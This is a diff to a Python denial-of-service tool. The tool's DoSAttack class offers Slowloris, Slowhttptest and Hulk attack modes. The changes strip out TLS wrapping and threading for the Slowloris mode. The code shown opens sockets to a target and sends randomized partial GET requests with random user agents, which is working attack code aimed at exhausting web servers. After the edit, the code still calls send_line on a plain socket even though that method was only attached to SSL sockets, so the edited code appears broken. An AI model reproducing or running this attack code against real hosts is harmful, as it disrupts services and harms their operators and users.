@@ -7,7 +7,6 @@ import random
 from random_string_generator import RandomStringGenerator
 import logging
 import sys
-import ssl
 
 
 logging.basicConfig(
@@ -27,7 +26,7 @@ class DoSAttack:
     def simulate_attack(self):
         for _ in range(self.num_connections):
             if self.attack_type == "Slowloris":
-                thread = threading.Thread(target=self.slowloris_attack)
+                self.slowloris_attack()
             elif self.attack_type == "Slowhttptest":
                 thread = threading.Thread(target=self.slowhttptest_attack)
             elif self.attack_type == "Hulk":
@@ -92,15 +91,8 @@ class DoSAttack:
         def init_socket(ip: str):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
-           
-            setattr(ssl.SSLSocket, "send_line", send_line)
-            setattr(ssl.SSLSocket, "send_header", send_header)
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            s = ctx.wrap_socket(s, server_hostname=self.target_ip)
 
-            s.connect((ip, self.port))
+            s.connect((ip, self.target_port))
 
             s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
             ua = random.choice(user_agents)
@@ -172,7 +164,6 @@ class DoSAttack:
     def wait_for_threads(self):
         for thread in self.threads:
             thread.join()
-
 
 if __name__ == "__main__":
     dos = DoSAttack(
